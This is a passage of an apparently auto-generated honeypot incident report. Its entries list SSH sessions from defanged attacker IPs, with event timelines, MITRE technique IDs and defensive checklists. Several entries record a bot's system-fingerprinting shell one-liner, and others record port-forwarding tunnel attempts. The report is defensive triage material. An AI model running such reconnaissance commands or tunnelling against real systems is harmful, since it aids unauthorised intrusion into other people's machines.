| `2026-07-25 09:33:06` | `cowrie.command.input` |
| `2026-07-25 09:33:06` | `cowrie.command.success` |
| `2026-07-25 09:33:06` | `cowrie.command.input` |
| `2026-07-25 09:33:06` | `cowrie.command.input` |
| `2026-07-25 09:33:06` | `cowrie.command.input` |
| `2026-07-25 09:33:06` | `cowrie.command.input` |
| `2026-07-25 09:33:06` | `cowrie.log.closed` |
| `2026-07-25 09:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04e7c794d9b5

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 09:33 |
| **Last Seen** | 2026-07-25 09:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:33:56` | `cowrie.session.connect` |
| `2026-07-25 09:33:56` | `cowrie.client.version` |
| `2026-07-25 09:33:57` | `cowrie.client.kex` |
| `2026-07-25 09:33:59` | `cowrie.login.success` |
| `2026-07-25 09:34:00` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:34:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 09:34:00` | `cowrie.direct-tcpip.data` |
| `2026-07-25 09:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b04bdf4822d6

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-25 09:34 |
| **Last Seen** | 2026-07-25 09:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:34:28` | `cowrie.session.connect` |
| `2026-07-25 09:34:28` | `cowrie.client.version` |
| `2026-07-25 09:34:28` | `cowrie.client.kex` |
| `2026-07-25 09:34:28` | `cowrie.login.success` |
| `2026-07-25 09:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c335ffe37c5f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-25 09:34 |
| **Last Seen** | 2026-07-25 09:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:34:28` | `cowrie.session.connect` |
| `2026-07-25 09:34:28` | `cowrie.client.version` |
| `2026-07-25 09:34:28` | `cowrie.client.kex` |
| `2026-07-25 09:34:28` | `cowrie.login.success` |
| `2026-07-25 09:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-962fcaedd879

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-25 09:34 |
| **Last Seen** | 2026-07-25 09:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:34:33` | `cowrie.session.connect` |
| `2026-07-25 09:34:33` | `cowrie.client.version` |
| `2026-07-25 09:34:33` | `cowrie.client.kex` |
| `2026-07-25 09:34:33` | `cowrie.login.success` |
| `2026-07-25 09:34:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15734787ef19

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-25 09:34 |
| **Last Seen** | 2026-07-25 09:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:34:33` | `cowrie.session.connect` |
| `2026-07-25 09:34:33` | `cowrie.client.version` |
| `2026-07-25 09:34:33` | `cowrie.client.kex` |
| `2026-07-25 09:34:33` | `cowrie.login.success` |
| `2026-07-25 09:34:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a75d507f32c

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 09:34 |
| **Last Seen** | 2026-07-25 09:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:34:55` | `cowrie.session.connect` |
| `2026-07-25 09:34:55` | `cowrie.client.version` |
| `2026-07-25 09:34:56` | `cowrie.client.kex` |
| `2026-07-25 09:34:59` | `cowrie.login.success` |
| `2026-07-25 09:34:59` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:35:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 09:35:00` | `cowrie.direct-tcpip.data` |
| `2026-07-25 09:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0865e1179dee

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:34 |
| **Last Seen** | 2026-07-25 09:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:34:56` | `cowrie.session.connect` |
| `2026-07-25 09:34:56` | `cowrie.client.version` |
| `2026-07-25 09:34:56` | `cowrie.client.kex` |
| `2026-07-25 09:34:57` | `cowrie.login.success` |
| `2026-07-25 09:34:59` | `cowrie.session.params` |
| `2026-07-25 09:34:59` | `cowrie.command.input` |
| `2026-07-25 09:34:59` | `cowrie.command.input` |
| `2026-07-25 09:34:59` | `cowrie.command.input` |
| `2026-07-25 09:34:59` | `cowrie.command.input` |
| `2026-07-25 09:34:59` | `cowrie.command.input` |
| `2026-07-25 09:34:59` | `cowrie.command.success` |
| `2026-07-25 09:34:59` | `cowrie.command.input` |
| `2026-07-25 09:34:59` | `cowrie.command.input` |
| `2026-07-25 09:34:59` | `cowrie.command.input` |
| `2026-07-25 09:34:59` | `cowrie.command.input` |
| `2026-07-25 09:34:59` | `cowrie.log.closed` |
| `2026-07-25 09:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b3cdfacec7c

| Field | Detail |
|---|---|
| **Source IP** | `116.99.172[.]197` |
| **First Seen** | 2026-07-25 09:35 |
| **Last Seen** | 2026-07-25 09:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:35:39` | `cowrie.session.connect` |
| `2026-07-25 09:35:39` | `cowrie.client.version` |
| `2026-07-25 09:35:39` | `cowrie.client.kex` |
| `2026-07-25 09:35:40` | `cowrie.login.success` |
| `2026-07-25 09:35:41` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:35:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 09:35:41` | `cowrie.direct-tcpip.data` |
| `2026-07-25 09:35:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.172[.]197` to AbuseIPDB if not already reported
- [ ] Block `116.99.172[.]197` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01b73d2ec047

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:36 |
| **Last Seen** | 2026-07-25 09:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:36:56` | `cowrie.session.connect` |
| `2026-07-25 09:36:56` | `cowrie.client.version` |
| `2026-07-25 09:36:56` | `cowrie.client.kex` |
| `2026-07-25 09:36:58` | `cowrie.login.success` |
| `2026-07-25 09:36:59` | `cowrie.session.params` |
| `2026-07-25 09:36:59` | `cowrie.command.input` |
| `2026-07-25 09:36:59` | `cowrie.command.input` |
| `2026-07-25 09:36:59` | `cowrie.command.input` |
| `2026-07-25 09:36:59` | `cowrie.command.input` |
| `2026-07-25 09:36:59` | `cowrie.command.input` |
| `2026-07-25 09:36:59` | `cowrie.command.success` |
| `2026-07-25 09:36:59` | `cowrie.command.input` |
| `2026-07-25 09:36:59` | `cowrie.command.input` |
| `2026-07-25 09:36:59` | `cowrie.command.input` |
| `2026-07-25 09:36:59` | `cowrie.command.input` |
| `2026-07-25 09:36:59` | `cowrie.log.closed` |
| `2026-07-25 09:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a363178e2e15

| Field | Detail |
|---|---|
| **Source IP** | `34.53.246[.]179` |
| **First Seen** | 2026-07-25 09:37 |
| **Last Seen** | 2026-07-25 09:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:37:36` | `cowrie.session.connect` |
| `2026-07-25 09:37:36` | `cowrie.login.success` |
| `2026-07-25 09:37:37` | `cowrie.session.params` |
| `2026-07-25 09:37:37` | `cowrie.command.input` |
| `2026-07-25 09:37:37` | `cowrie.command.input` |
| `2026-07-25 09:37:37` | `cowrie.command.failed` |
| `2026-07-25 09:37:37` | `cowrie.command.input` |
| `2026-07-25 09:37:37` | `cowrie.log.closed` |
| `2026-07-25 09:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.246[.]179` to AbuseIPDB if not already reported
- [ ] Block `34.53.246[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-115e2dd48368

| Field | Detail |
|---|---|
| **Source IP** | `34.53.246[.]179` |
| **First Seen** | 2026-07-25 09:37 |
| **Last Seen** | 2026-07-25 09:38 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:37:49` | `cowrie.session.connect` |
| `2026-07-25 09:37:49` | `cowrie.login.success` |
| `2026-07-25 09:37:50` | `cowrie.session.params` |
| `2026-07-25 09:37:50` | `cowrie.command.input` |
| `2026-07-25 09:37:50` | `cowrie.command.failed` |
| `2026-07-25 09:38:28` | `cowrie.log.closed` |
| `2026-07-25 09:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.246[.]179` to AbuseIPDB if not already reported
- [ ] Block `34.53.246[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce0c7674e605

| Field | Detail |
|---|---|
| **Source IP** | `34.53.246[.]179` |
| **First Seen** | 2026-07-25 09:37 |
| **Last Seen** | 2026-07-25 09:38 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:37:51` | `cowrie.session.connect` |
| `2026-07-25 09:37:51` | `cowrie.login.success` |
| `2026-07-25 09:37:52` | `cowrie.session.params` |
| `2026-07-25 09:37:52` | `cowrie.command.input` |
| `2026-07-25 09:38:28` | `cowrie.log.closed` |
| `2026-07-25 09:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.246[.]179` to AbuseIPDB if not already reported
- [ ] Block `34.53.246[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94d6991d9fab

| Field | Detail |
|---|---|
| **Source IP** | `116.99.172[.]197` |
| **First Seen** | 2026-07-25 09:38 |
| **Last Seen** | 2026-07-25 09:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:38:34` | `cowrie.session.connect` |
| `2026-07-25 09:38:34` | `cowrie.client.version` |
| `2026-07-25 09:38:34` | `cowrie.client.kex` |
| `2026-07-25 09:38:35` | `cowrie.login.success` |
| `2026-07-25 09:38:35` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:38:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 09:38:36` | `cowrie.direct-tcpip.data` |
| `2026-07-25 09:38:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.172[.]197` to AbuseIPDB if not already reported
- [ ] Block `116.99.172[.]197` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bea27f494c0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:39 |
| **Last Seen** | 2026-07-25 09:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:39:00` | `cowrie.session.connect` |
| `2026-07-25 09:39:00` | `cowrie.client.version` |
| `2026-07-25 09:39:00` | `cowrie.client.kex` |
| `2026-07-25 09:39:01` | `cowrie.login.success` |
| `2026-07-25 09:39:02` | `cowrie.session.params` |
| `2026-07-25 09:39:02` | `cowrie.command.input` |
| `2026-07-25 09:39:02` | `cowrie.command.input` |
| `2026-07-25 09:39:02` | `cowrie.command.input` |
| `2026-07-25 09:39:02` | `cowrie.command.input` |
| `2026-07-25 09:39:02` | `cowrie.command.input` |
| `2026-07-25 09:39:02` | `cowrie.command.success` |
| `2026-07-25 09:39:02` | `cowrie.command.input` |
| `2026-07-25 09:39:02` | `cowrie.command.input` |
| `2026-07-25 09:39:02` | `cowrie.command.input` |
| `2026-07-25 09:39:02` | `cowrie.command.input` |
| `2026-07-25 09:39:03` | `cowrie.log.closed` |
| `2026-07-25 09:39:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f63974f73ab

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:40 |
| **Last Seen** | 2026-07-25 09:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:40:52` | `cowrie.session.connect` |
| `2026-07-25 09:40:52` | `cowrie.client.version` |
| `2026-07-25 09:40:52` | `cowrie.client.kex` |
| `2026-07-25 09:40:53` | `cowrie.login.success` |
| `2026-07-25 09:40:55` | `cowrie.session.params` |
| `2026-07-25 09:40:55` | `cowrie.command.input` |
| `2026-07-25 09:40:55` | `cowrie.command.input` |
| `2026-07-25 09:40:55` | `cowrie.command.input` |
| `2026-07-25 09:40:55` | `cowrie.command.input` |
| `2026-07-25 09:40:55` | `cowrie.command.input` |
| `2026-07-25 09:40:55` | `cowrie.command.success` |
| `2026-07-25 09:40:55` | `cowrie.command.input` |
| `2026-07-25 09:40:55` | `cowrie.command.input` |
| `2026-07-25 09:40:55` | `cowrie.command.input` |
| `2026-07-25 09:40:55` | `cowrie.command.input` |
| `2026-07-25 09:40:55` | `cowrie.log.closed` |
| `2026-07-25 09:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b83a849c08a5

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 09:41 |
| **Last Seen** | 2026-07-25 09:43 |
| **Session Duration** | 122s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:41:27` | `cowrie.session.connect` |
| `2026-07-25 09:41:33` | `cowrie.client.version` |
| `2026-07-25 09:41:33` | `cowrie.client.kex` |
| `2026-07-25 09:42:01` | `cowrie.login.success` |
| `2026-07-25 09:43:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09597b01bfb4

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 09:41 |
| **Last Seen** | 2026-07-25 09:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:41:58` | `cowrie.session.connect` |
| `2026-07-25 09:41:58` | `cowrie.client.version` |
| `2026-07-25 09:41:58` | `cowrie.client.kex` |
| `2026-07-25 09:41:59` | `cowrie.login.success` |
| `2026-07-25 09:41:59` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:42:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 09:42:00` | `cowrie.direct-tcpip.data` |
| `2026-07-25 09:42:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-debd4237a63a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:42 |
| **Last Seen** | 2026-07-25 09:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:42:46` | `cowrie.session.connect` |
| `2026-07-25 09:42:46` | `cowrie.client.version` |
| `2026-07-25 09:42:46` | `cowrie.client.kex` |
| `2026-07-25 09:42:47` | `cowrie.login.success` |
| `2026-07-25 09:42:49` | `cowrie.session.params` |
| `2026-07-25 09:42:49` | `cowrie.command.input` |
| `2026-07-25 09:42:49` | `cowrie.command.input` |
| `2026-07-25 09:42:49` | `cowrie.command.input` |
| `2026-07-25 09:42:49` | `cowrie.command.input` |
| `2026-07-25 09:42:49` | `cowrie.command.input` |
| `2026-07-25 09:42:49` | `cowrie.command.success` |
| `2026-07-25 09:42:49` | `cowrie.command.input` |
| `2026-07-25 09:42:49` | `cowrie.command.input` |
| `2026-07-25 09:42:49` | `cowrie.command.input` |
| `2026-07-25 09:42:49` | `cowrie.command.input` |
| `2026-07-25 09:42:49` | `cowrie.log.closed` |
| `2026-07-25 09:42:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64901d0f6541

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:44 |
| **Last Seen** | 2026-07-25 09:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:44:39` | `cowrie.session.connect` |
| `2026-07-25 09:44:40` | `cowrie.client.version` |
| `2026-07-25 09:44:40` | `cowrie.client.kex` |
| `2026-07-25 09:44:41` | `cowrie.login.success` |
| `2026-07-25 09:44:43` | `cowrie.session.params` |
| `2026-07-25 09:44:43` | `cowrie.command.input` |
| `2026-07-25 09:44:43` | `cowrie.command.input` |
| `2026-07-25 09:44:43` | `cowrie.command.input` |
| `2026-07-25 09:44:43` | `cowrie.command.input` |
| `2026-07-25 09:44:43` | `cowrie.command.input` |
| `2026-07-25 09:44:43` | `cowrie.command.success` |
| `2026-07-25 09:44:43` | `cowrie.command.input` |
| `2026-07-25 09:44:43` | `cowrie.command.input` |
| `2026-07-25 09:44:43` | `cowrie.command.input` |
| `2026-07-25 09:44:43` | `cowrie.command.input` |
| `2026-07-25 09:44:43` | `cowrie.log.closed` |
| `2026-07-25 09:44:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
